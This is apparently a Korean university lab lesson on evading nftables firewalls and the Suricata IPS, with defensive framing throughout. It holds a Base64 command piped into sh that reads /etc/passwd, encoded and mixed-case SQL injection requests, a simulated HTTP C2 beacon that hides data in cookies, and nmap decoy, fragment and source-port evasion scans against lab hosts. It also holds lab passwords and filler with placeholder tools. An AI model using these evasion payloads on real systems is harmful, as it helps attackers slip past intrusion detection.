# Week 10: IPS/방화벽 우회 기법 (상세 버전)

## 학습 목표
- nftables 방화벽 규칙의 구조를 이해하고 분석할 수 있다
- Suricata IPS의 탐지 규칙을 읽고 해석할 수 있다
- 인코딩 기반 우회(Base64, URL 인코딩)의 원리를 설명할 수 있다
- 터널링(ICMP, HTTP)의 개념과 탐지 회피 원리를 이해한다
- 실습 환경에서 방화벽 규칙 분석과 우회 실험을 수행한다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |


# 본 강의 내용

# Week 10: IPS/방화벽 우회 기법

## 학습 목표

- nftables 방화벽 규칙의 구조를 이해하고 분석할 수 있다
- Suricata IPS의 탐지 규칙을 읽고 해석할 수 있다
- 인코딩 기반 우회(Base64, URL 인코딩)의 원리를 설명할 수 있다
- 터널링(ICMP, HTTP)의 개념과 탐지 회피 원리를 이해한다
- 실습 환경에서 방화벽 규칙 분석과 우회 실험을 수행한다

---

## 1. nftables 방화벽 분석

### 1.1 nftables란?

nftables는 Linux의 차세대 패킷 필터링 프레임워크이다. 기존 iptables를 대체한다.

**핵심 개념:**
- **테이블(table)**: 규칙 모음의 최상위 컨테이너
- **체인(chain)**: 패킷 처리 규칙의 순서 목록
- **규칙(rule)**: 매칭 조건 + 동작(accept, drop, reject)

### 1.2 nftables 규칙 구조

```
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;

        # 상태 추적: 기존 연결 허용
        ct state established,related accept

        # 루프백 허용
        iif lo accept

        # SSH 허용
        tcp dport 22 accept

        # ICMP 허용
        ip protocol icmp accept

        # 나머지 모두 차단 (policy drop)
    }

    chain forward {
        type filter hook forward priority 0; policy drop;
        # 포워딩 규칙...
    }

    chain output {
        type filter hook output priority 0; policy accept;
    }
}
```

### 1.3 규칙 읽는 법

```
tcp dport 22 accept
│   │        │
│   │        └ 동작: 허용
│   └ 조건: 목적지 포트 22
└ 프로토콜: TCP
```

**주요 매칭 표현:**
| 표현 | 의미 |
|------|------|
| `tcp dport 80` | TCP 목적지 포트 80 |
| `ip saddr 10.0.0.0/8` | 출발지 IP 대역 |
| `ct state new` | 새로운 연결 |
| `iif eth0` | 입력 인터페이스 |
| `tcp flags & syn == syn` | SYN 플래그 설정된 패킷 |

---

## 2. Suricata IPS 규칙 분석

### 2.1 Suricata란?

Suricata는 오픈소스 IDS/IPS(침입 탐지/방지 시스템)이다. 네트워크 트래픽을 실시간으로 분석하여 공격을 탐지하고 차단한다.

### 2.2 Suricata 규칙 형식

```
action protocol src_ip src_port -> dst_ip dst_port (옵션들;)
```

**예시:**
```
alert http any any -> $HOME_NET any (
    msg:"SQL Injection Attempt";
    content:"UNION SELECT";
    nocase;
    sid:1000001;
    rev:1;
)
```

**구성 요소 해석:**
| 요소 | 의미 |
|------|------|
| `alert` | 동작: 경고 생성 (drop이면 차단) |
| `http` | 프로토콜 |
| `any any` | 출발지 IP/포트 (모두) |
| `-> $HOME_NET any` | 목적지: 내부 네트워크 |
| `content:"UNION SELECT"` | 패킷에 이 문자열 포함 시 |
| `nocase` | 대소문자 구분 없음 |
| `sid:1000001` | 규칙 고유 ID |

### 2.3 IPS 동작 모드

```
IDS 모드 (탐지만):
  패킷 → [Suricata] → 경고 로그 기록 → 패킷 통과

IPS 모드 (탐지 + 차단):
  패킷 → [Suricata] → 규칙 매칭 → drop → 패킷 폐기
                                  → accept → 패킷 통과
```

### 2.4 주요 탐지 키워드

| 키워드 | 설명 |
|--------|------|
| `content` | 패킷 내 문자열 매칭 |
| `pcre` | 정규표현식 매칭 |
| `flow` | 연결 방향 (to_server, to_client) |
| `threshold` | 반복 횟수 조건 |
| `http_uri` | HTTP URI만 검사 |
| `http_header` | HTTP 헤더만 검사 |

---

## 3. 우회 기법

### 3.1 인코딩 기반 우회

IPS 규칙이 특정 문자열을 탐지한다면, 같은 의미를 다른 형태로 인코딩하여 우회한다.

#### URL 인코딩

```
원본:        UNION SELECT
URL 인코딩:  %55%4E%49%4F%4E%20%53%45%4C%45%43%54
이중 인코딩: %2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554
```

#### Base64 인코딩

```bash
# 명령어를 Base64로 인코딩
echo -n "cat /etc/passwd" | base64
# 출력: Y2F0IC9ldGMvcGFzc3dk

# 디코딩 후 실행 (원격에서)
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

#### 대소문자 혼합

```
원본:  UNION SELECT
우회:  uNiOn SeLeCt
우회:  UnIoN sElEcT
```

> **방어**: Suricata의 `nocase` 키워드는 대소문자 혼합을 탐지한다.

### 3.2 패킷 분할 (Fragmentation)

큰 패킷을 작은 조각으로 나누어 시그니처 매칭을 회피한다.

```
원본 패킷: [UNION SELECT * FROM users]

분할 후:
  조각 1: [UNION SEL]
  조각 2: [ECT * FRO]
  조각 3: [M users]

→ IPS가 개별 조각만 검사하면 "UNION SELECT" 문자열을 탐지하지 못한다
```

### 3.3 터널링

#### ICMP 터널링

ICMP(ping) 패킷의 데이터 영역에 임의 데이터를 넣어 전송한다.

```
정상 ping:
  ICMP Echo Request [표준 패딩 데이터 56바이트]

ICMP 터널:
  ICMP Echo Request [숨겨진 명령어/데이터 1400바이트]
```

- 방화벽이 ICMP를 허용하면 데이터가 통과한다
- 비정상적으로 큰 ICMP 패킷은 탐지 가능하다

#### HTTP 터널링

정상적인 HTTP 요청/응답 안에 C2(Command & Control) 통신을 숨긴다.

```
정상 HTTP:
  GET /index.html HTTP/1.1
  Host: www.example.com

C2 비콘:
  GET /images/logo.png?id=base64_encoded_command HTTP/1.1
  Host: www.example.com
  Cookie: session=base64_encoded_system_info
```

- 정상 웹 트래픽과 구분이 어렵다
- HTTPS를 사용하면 내용 검사 자체가 불가능하다

---

## 4. 실습

### 실습 환경

| 서버 | IP | 역할 |
|------|-----|------|
| opsclaw | 10.20.30.201 | 공격자 |
| secu | 10.20.30.1 | nftables + Suricata IPS |
| web | 10.20.30.80 | 대상 (JuiceShop:3000) |

### 실습 1: secu의 nftables 규칙 분석

```bash
# secu 서버 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1

# nftables 규칙 확인
sudo nft list ruleset

# 예상 출력 (환경에 따라 다름):
# table inet filter {
#     chain input {
#         type filter hook input priority filter; policy accept;
#         ...
#     }
#     chain forward {
#         type filter hook forward priority filter; policy accept;
#         ct state established,related accept
#         ...
#     }
# }

# 특정 테이블만 확인
sudo nft list table inet filter

# 카운터가 있는 규칙의 히트 수 확인
sudo nft list ruleset -a
```

**분석 질문:**
1. 기본 정책(policy)은 accept인가 drop인가?
2. 어떤 포트가 명시적으로 허용되어 있는가?
3. forward 체인에서 내부 네트워크 간 트래픽은 어떻게 처리되는가?

### 실습 2: Suricata 규칙 확인

```bash
# secu 서버에서 Suricata 규칙 파일 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo ls /etc/suricata/rules/"

# 로컬 규칙 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo cat /etc/suricata/rules/local.rules 2>/dev/null || echo '로컬 규칙 없음'"

# Suricata 설정 파일에서 규칙 경로 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo grep -n 'rule-files\|rule-path' /etc/suricata/suricata.yaml | head -20"

# Suricata 상태 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo systemctl status suricata"

# 최근 경고 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log 2>/dev/null || echo '로그 없음'"
```

### 실습 3: ICMP 터널링 실험

비정상적으로 큰 ICMP 패킷을 전송하여 방화벽 통과를 확인한다.

```bash
# 터미널 1: secu에서 ICMP 패킷 모니터링
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo tcpdump -i eth0 icmp -nn -c 10 -X"

# 터미널 2: opsclaw에서 정상 크기 ping
ping -c 3 10.20.30.80
# → 기본 56바이트 데이터

# 터미널 2: 비정상적으로 큰 ping (1400바이트)
ping -s 1400 -c 3 10.20.30.80

# 예상 출력:
# PING 10.20.30.80 (10.20.30.80) 1400(1428) bytes of data.
# 1408 bytes from 10.20.30.80: icmp_seq=1 ttl=64 time=0.8 ms
# 1408 bytes from 10.20.30.80: icmp_seq=2 ttl=64 time=0.6 ms

# 터미널 2: 패턴 데이터가 포함된 ping
ping -s 1400 -p deadbeef -c 3 10.20.30.80
# → ICMP 데이터 영역에 0xdeadbeef 패턴이 반복됨
```

**secu의 tcpdump에서 관찰할 내용:**
- 정상 ping과 큰 ping의 패킷 크기 차이
- `-X` 옵션으로 데이터 영역의 내용 확인
- 실제 ICMP 터널링 도구는 이 데이터 영역에 명령어를 넣는다

### 실습 4: HTTP C2 비콘 시뮬레이션

정상 HTTP 요청처럼 보이지만 데이터를 숨기는 방법을 실습한다.

```bash
# 시스템 정보를 Base64로 인코딩
SYSINFO=$(hostname | base64)
echo "인코딩된 시스템 정보: $SYSINFO"

# 정상처럼 보이는 HTTP 요청에 데이터 숨기기
curl -s "http://10.20.30.80:3000/rest/products/search?q=test" \
  -H "Cookie: session=$SYSINFO" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# URL 파라미터에 인코딩된 명령 포함
CMD=$(echo -n "whoami" | base64)
curl -s "http://10.20.30.80:3000/rest/products/search?q=juice&ref=$CMD"

# secu에서 이 트래픽을 모니터링
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo tcpdump -i eth0 port 3000 -A -nn -c 20"
```

### 실습 5: URL 인코딩 우회 테스트

```bash
# 정상 SQL Injection 시도 (Suricata가 탐지할 수 있음)
curl -s "http://10.20.30.80:3000/rest/products/search?q=test' UNION SELECT 1--"

# URL 인코딩된 버전
curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201--"

# 이중 인코딩된 버전
curl -s "http://10.20.30.80:3000/rest/products/search?q=test%2527%2520UNION%2520SELECT%25201--"

# 대소문자 혼합
curl -s "http://10.20.30.80:3000/rest/products/search?q=test' uNiOn SeLeCt 1--"

# Suricata 경고 로그 확인 (각 요청 후)
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo tail -5 /var/log/suricata/fast.log 2>/dev/null"
```

### 실습 6: nmap 스캔 우회 기법

```bash
# 기본 스캔 (탐지 가능)
nmap -sT 10.20.30.80

# 느린 스캔 (탐지 회피 시도)
nmap -sS -T1 10.20.30.80 -p 22,80,3000

# 분할 패킷 스캔
sudo nmap -f 10.20.30.80 -p 22,80,3000

# 디코이(미끼) 스캔 - 가짜 출발지 IP 포함
sudo nmap -D RND:5 10.20.30.80 -p 22,80,3000
# → secu에서 여러 IP에서 스캔이 온 것처럼 보임

# 출발지 포트 변조 (신뢰 포트 사용)
sudo nmap --source-port 53 10.20.30.80 -p 22,80,3000
# → DNS 응답처럼 보이게 함
```

---

## 5. 우회 기법 vs 방어 대응 정리

| 우회 기법 | 원리 | IPS 대응 방법 |
|-----------|------|---------------|
| URL 인코딩 | 특수문자를 %XX로 변환 | HTTP 디코딩 후 검사 |
| 이중 인코딩 | 인코딩을 2번 적용 | 재귀적 디코딩 |
| 대소문자 혼합 | SQL 키워드 변형 | nocase 키워드 사용 |
| 패킷 분할 | 시그니처를 조각냄 | 재조립 후 검사 |
| 느린 스캔 | 탐지 임계값 이하 | 장기간 통계 분석 |
| ICMP 터널 | 허용된 프로토콜 이용 | 페이로드 크기/패턴 검사 |
| HTTP 터널 | 정상 트래픽 위장 | 행위 기반 분석, ML |

---

## 6. 실습 과제

1. **규칙 분석 보고서**: secu의 nftables 규칙과 Suricata 규칙을 분석하여, 현재 방어 체계의 강점과 약점을 5가지 이상 서술하라.
2. **우회 실험 기록**: 각 우회 기법을 시도하고, 성공/실패 여부와 Suricata 로그를 기록하라.
3. **방어 규칙 제안**: 실습에서 성공한 우회에 대한 Suricata 규칙을 1개 이상 작성하라.

---

## 7. 핵심 정리

- 방화벽과 IPS는 완벽하지 않다. 규칙의 한계를 이해해야 방어를 강화할 수 있다.
- 인코딩 우회는 가장 기본적인 기법이며, 현대 IPS는 대부분 디코딩 후 검사한다.
- 터널링은 허용된 프로토콜을 악용하므로 탐지가 어렵다.
- **공격자의 우회 기법을 아는 것이 더 나은 방어의 시작이다.**

**다음 주 예고**: Week 11에서는 서버 침투 후 권한 상승(Privilege Escalation) 기법을 학습한다. web 서버에서 SUID, sudo, cron 등을 이용한 권한 상승을 직접 실습한다.


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 1)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 10: IPS/방화벽 우회 기법"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **공격/침투 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 ATT&CK의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **보안 취약점 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

